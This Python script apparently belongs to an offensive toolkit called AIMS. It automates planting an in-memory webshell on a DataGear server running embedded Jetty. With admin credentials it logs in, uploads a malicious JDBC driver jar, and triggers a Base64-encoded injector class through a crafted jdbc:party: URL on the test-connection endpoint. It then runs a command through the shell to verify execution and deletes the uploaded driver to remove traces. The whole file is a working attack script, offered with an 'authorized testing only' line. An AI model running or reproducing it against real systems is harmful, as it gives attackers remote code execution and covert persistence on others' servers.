#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Example extension: deliver an AIMS-generated DefaultBase64 injector through a
DataGear admin "custom JDBC driver" upload.

Core AIMS is delivery-agnostic. This file is only an example for one scenario:
  - you have DataGear admin credentials
  - the target runs Jetty 8/9 (DataGear 1.13.x embedded Jetty)
  - `aims.py gen --server Jetty --version 8.1 --type Filter --tool Command` was used

The runner is a generic JDBC driver: jdbc:party:<Base64(injector class)>
It defines the injector class and instantiates it; MemShellParty's injector
finds the WebAppContext and registers the shell.

Authorized testing only.
"""
import argparse
import base64
import json
import os
import secrets
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar
from pathlib import Path

STATE = Path(os.path.expanduser("~/.aims/state.json"))
HERE = Path(__file__).resolve().parent
RUNNER_JAR = HERE / "payload" / "party" / "party.jar"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def opener():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx),
        urllib.request.HTTPCookieProcessor(CookieJar()),
        NoRedirect(),
    )


def http(method, url, data=None, headers=None, timeout=30, op=None):
    hdrs = dict(headers or {})
    if data is not None and "Content-Type" not in hdrs:
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with (op or opener()).open(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def jbody(b):
    try:
        return json.loads(b.decode("utf-8", "replace"))
    except Exception:
        return None


def multipart(fields, files):
    b = "----aims" + secrets.token_hex(12)
    out = bytearray()
    for k, v in fields.items():
        out += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (b, k, v)).encode()
    for k, (fn, data, ct) in files.items():
        out += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\nContent-Type: %s\r\n\r\n" % (b, k, fn, ct)).encode()
        out += data + b"\r\n"
    out += ("--%s--\r\n" % b).encode()
    return bytes(out), "multipart/form-data; boundary=%s" % b


def encode_cmd(cmd, encryptor):
    e = (encryptor or "RAW").upper()
    if e == "RAW":
        return cmd
    if e == "BASE64":
        return base64.b64encode(cmd.encode()).decode()
    if e == "DOUBLE_BASE64":
        return base64.b64encode(base64.b64encode(cmd.encode())).decode()
    raise SystemExit("unsupported encryptor: %s" % encryptor)


def shell(url, param, cmd, encryptor, timeout=30):
    body = urllib.parse.urlencode({param: encode_cmd(cmd, encryptor)}).encode()
    status, raw = http("POST", url, body,
                       {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
                       timeout=timeout)
    text = raw.decode("utf-8", "replace")
    if status != 200 or "<!DOCTYPE html>" in text[:200]:
        raise RuntimeError("shell not responding (HTTP %s)" % status)
    return text


def login(target, admin):
    if not admin or ":" not in admin:
        raise SystemExit("need --admin USER:PASS (or AIMS_ADMIN)")
    user, pw = admin.split(":", 1)
    op = opener()
    http("POST", target.rstrip("/") + "/login/doLogin",
         urllib.parse.urlencode({"name": user, "password": pw}).encode(),
         {"Content-Type": "application/x-www-form-urlencoded"}, op=op)
    s, raw = http("POST", target.rstrip("/") + "/user/queryData",
                  json.dumps({"page": 1, "pageSize": 1}).encode(),
                  {"Content-Type": "application/json"}, op=op)
    if s != 200 or not isinstance(jbody(raw), list):
        raise SystemExit("admin login failed")
    return op


def main():
    p = argparse.ArgumentParser(description="DataGear JDBC delivery example")
    p.add_argument("--state", default=str(STATE))
    p.add_argument("--admin", default=os.environ.get("AIMS_ADMIN"))
    p.add_argument("--runner-id", default=None)
    p.add_argument("--keep-runner", action="store_true")
    p.add_argument("--timeout", type=int, default=60)
    args = p.parse_args()

    try:
        st = json.loads(Path(args.state).read_text(encoding="utf-8"))
    except Exception:
        raise SystemExit("no state: %s (run: aims.py gen ...)" % args.state)
    target = st.get("target")
    payload_file = st.get("payload_file")
    shell_url = st.get("shell_url")
    param = st.get("param")
    encryptor = st.get("encryptor") or "BASE64"
    if not (target and payload_file and shell_url and param):
        raise SystemExit("incomplete state; run aims.py gen with --target and --tool Command")
    payload = Path(payload_file).read_text(encoding="utf-8").strip()
    if not RUNNER_JAR.exists():
        raise SystemExit("runner jar missing: %s" % RUNNER_JAR)

    op = login(target, args.admin)
    runner = args.runner_id or ("aims" + str(int(time.time() * 1000))[-10:])

    body, ctype = multipart({"id": runner},
                            {"file": ("party.jar", RUNNER_JAR.read_bytes(), "application/java-archive")})
    s, raw = http("POST", target + "/driverEntity/uploadDriverFile", body, {"Content-Type": ctype}, op=op)
    if s != 200:
        raise SystemExit("upload failed: HTTP %s" % s)

    form = urllib.parse.urlencode({
        "id": runner, "driverClassName": "party.PartyDriver", "displayName": "AIMS",
        "jreVersion": "8", "databaseName": "AIMS", "driverLibraryName": "party.jar",
    }).encode()
    s, raw = http("POST", target + "/driverEntity/saveAdd", form,
                  {"Content-Type": "application/x-www-form-urlencoded"}, op=op)
    if s != 200:
        raise SystemExit("saveAdd failed: HTTP %s" % s)

    form = urllib.parse.urlencode({
        "id": "", "title": "t", "url": "jdbc:party:" + payload,
        "user": "u", "password": "p", "driverEntity.id": runner,
    }).encode()
    s, raw = http("POST", target + "/schema/testConnection", form,
                  {"Content-Type": "application/x-www-form-urlencoded"}, timeout=args.timeout, op=op)
    if s != 200:
        raise SystemExit("trigger failed: HTTP %s" % s)

    try:
        sample = shell(shell_url, param, "id", encryptor)
    except Exception as e:
        raise SystemExit("shell verification failed (%s); runner kept: %s" % (e, runner))

    deleted = False
    if not args.keep_runner:
        s, raw = http("POST", target + "/driverEntity/delete", json.dumps([runner]).encode(),
                      {"Content-Type": "application/json"}, op=op)
        deleted = s == 200

    print(json.dumps({
        "ok": True, "shell_url": shell_url, "param": param, "encryptor": encryptor,
        "runner": runner, "runner_deleted": deleted, "verified": True,
        "sample": sample.strip()[:200],
    }, ensure_ascii=False))


if __name__ == "__main__":
    main()
